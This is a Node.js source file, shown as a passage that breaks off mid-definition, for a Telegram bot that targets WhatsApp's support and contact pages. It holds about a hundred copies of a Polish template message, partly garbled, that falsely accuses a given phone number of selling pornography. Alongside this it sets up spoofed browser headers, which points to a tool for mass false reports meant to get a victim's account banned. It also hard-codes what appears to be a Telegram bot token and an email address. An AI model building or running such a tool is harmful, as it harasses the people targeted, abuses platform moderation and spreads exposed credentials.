const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const https = require('https');

// Konfigurasi Bot
const TOKEN = '7901822583:AAE5HS_OwFcRf6iMUHNfQK9zkP_cIwb7TxM';
const bot = new TelegramBot(TOKEN, {polling: true});

// URL Target WhatsApp (updated with the new URL)
const WHATSAPP_URLS = [
    'https://www.whatsapp.com/contact/?subject=messenger',
    'https://faq.whatsapp.com/465883178708358/?helpref=uf_share',
    'https://static.whatsapp.net/rsrc.php/v4/yR/r/ERz6pNGhHp8.js'
];

// Data Default
const DEFAULT_EMAIL = 'hozooimut@gmail.com';
const DEFAULT_MESSAGES = [
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,
    (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`,


];
const BROWSER_HEADERS = [
    {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
